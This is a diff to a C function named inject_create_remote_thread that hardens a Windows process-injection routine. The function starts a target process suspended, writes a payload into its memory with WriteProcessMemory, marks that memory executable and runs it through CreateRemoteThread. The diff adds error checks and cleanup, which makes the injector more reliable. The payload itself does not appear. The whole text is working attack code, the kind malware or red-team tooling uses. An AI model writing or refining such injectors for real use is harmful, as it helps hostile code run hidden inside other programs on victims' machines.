@@ -24,13 +24,40 @@ void inject_create_remote_thread() {
 	HANDLE hThread;
 	DWORD old;
 
-	CreateProcessA(NULL, target_process, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
+	if (!CreateProcessA(NULL, target_process, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
+		return;
+	}
+
 	buf = VirtualAllocEx(pi.hProcess, NULL, payload_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-	WriteProcessMemory(pi.hProcess, buf, payload, payload_size, NULL);
-	VirtualProtectEx(pi.hProcess, buf, payload_size, PAGE_EXECUTE_READ, &old);
+	if (!buf) {
+		TerminateProcess(pi.hProcess, 0);
+		CloseHandle(pi.hProcess);
+		CloseHandle(pi.hThread);
+		return;
+	}
+
+	if (!WriteProcessMemory(pi.hProcess, buf, payload, payload_size, NULL)) {
+		VirtualFreeEx(pi.hProcess, buf, 0, MEM_RELEASE);
+		TerminateProcess(pi.hProcess, 0);
+		CloseHandle(pi.hProcess);
+		CloseHandle(pi.hThread);
+		return;
+	}
+
+	if (!VirtualProtectEx(pi.hProcess, buf, payload_size, PAGE_EXECUTE_READ, &old)) {
+		VirtualFreeEx(pi.hProcess, buf, 0, MEM_RELEASE);
+		TerminateProcess(pi.hProcess, 0);
+		CloseHandle(pi.hProcess);
+		CloseHandle(pi.hThread);
+		return;
+	}
+
 	hThread = CreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)buf, NULL, 0, NULL);
+	if (hThread) {
+		CloseHandle(hThread);
+	}
+
 	ResumeThread(pi.hThread);
-	CloseHandle(hThread);
 	CloseHandle(pi.hProcess);
 	CloseHandle(pi.hThread);
 }
